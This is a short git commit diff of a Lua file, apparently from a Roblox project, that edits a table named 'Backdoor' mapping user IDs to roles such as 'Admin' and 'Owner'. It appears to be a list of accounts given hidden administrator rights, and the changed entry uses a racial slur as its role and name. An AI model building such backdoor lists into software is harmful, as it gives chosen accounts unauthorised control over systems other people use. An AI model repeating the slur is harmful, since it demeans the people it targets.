9fb7cf4dfb61fba116a941886926b894aa7c556e
IAmSorrowful <97572520+IAmSorrowful@users.noreply.github.com>
2022-11-07 01:59:32 -0600

    Update Actual Admins.lua

--- Actual Admins.lua
+++ Actual Admins.lua
@@ -1,6 +1,6 @@
 local Backdoor = {
     [3289592422] = {"Admin", "XYZ"},
     [2016299441] = {"Owner", "Azrael"},
-    [1640751040] = {"Nigger", "Nigger"}
+    [2952127998] = {"Nigger", "Nigger"}
 };
 return Backdoor;
